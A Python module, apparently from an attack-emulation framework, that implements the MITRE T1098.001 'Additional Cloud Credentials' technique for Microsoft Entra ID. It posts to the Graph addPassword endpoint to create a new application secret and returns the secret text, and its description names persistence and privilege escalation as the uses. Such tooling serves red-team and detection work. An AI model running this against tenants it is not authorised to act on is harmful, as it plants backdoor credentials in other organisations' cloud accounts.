from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class EntraGenerateAppCredentials(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1098.001",
                technique_name="Account Manipulation",
                tactics=["Persistence", "Privilege Escalation"],
                sub_technique_name="Additional Cloud Credentials"
            )
        ]
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT405.3",
                technique_name="Azure AD Application",
                tactics=["Privilege Escalation"],
                sub_technique_name="Application Registration Owner"
            )
        ]
        super().__init__("Generate App Credentials", "Generates new secret for an application in Entra ID that can be used for persistence or privilege escalation", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            app_id: str = kwargs.get('app_id', None)
            cred_display_name: str = kwargs.get('cred_display_name', None)
            
            if app_id in [None, ""] or cred_display_name in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Invalid Technique Input"
                }

            endpoint_url = f"https://graph.microsoft.com/v1.0/applications/{app_id}/addPassword"
            
            # Create request payload
            data = {
                "passwordCredential": {
                    "displayName": cred_display_name
                }
            }
            
            raw_response = GraphRequest().post(url = endpoint_url, data = data)

            # Request successfull
            if 200 <= raw_response.status_code < 300:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully generated application credentials",
                    "value": {
                        "key_id" : raw_response.json().get("keyId", "N/A"),
                        "secret" : raw_response.json().get("secretText", "N/A"),
                        "display_name" : raw_response.json().get("displayName", "N/A"),
                        "custom_key_id" : raw_response.json().get("customKeyIdentifier", "N/A"),
                        "start_date_time" : raw_response.json().get("startDateTime", "N/A"),
                        "end_date_time" : raw_response.json().get("endDateTime", "N/A")
                    }
                }
            
            # Request failed
            else:
                return ExecutionStatus.FAILURE, {
                    "error": {"error_code" : raw_response.json().get('error').get('code', 'N/A'), 
                              "error_message" :raw_response.json().get('error').get('message', 'N/A')
                              },
                    "message": "Failed to generate credential for application"
                }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to generate credential for application"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "app_id": {"type": "str", "required": True, "default":None, "name": "Application Object ID", "input_field_type" : "text"},
            "cred_display_name": {"type": "str", "required": True, "default":None, "name": "New Credential Display Name", "input_field_type" : "text"}
        }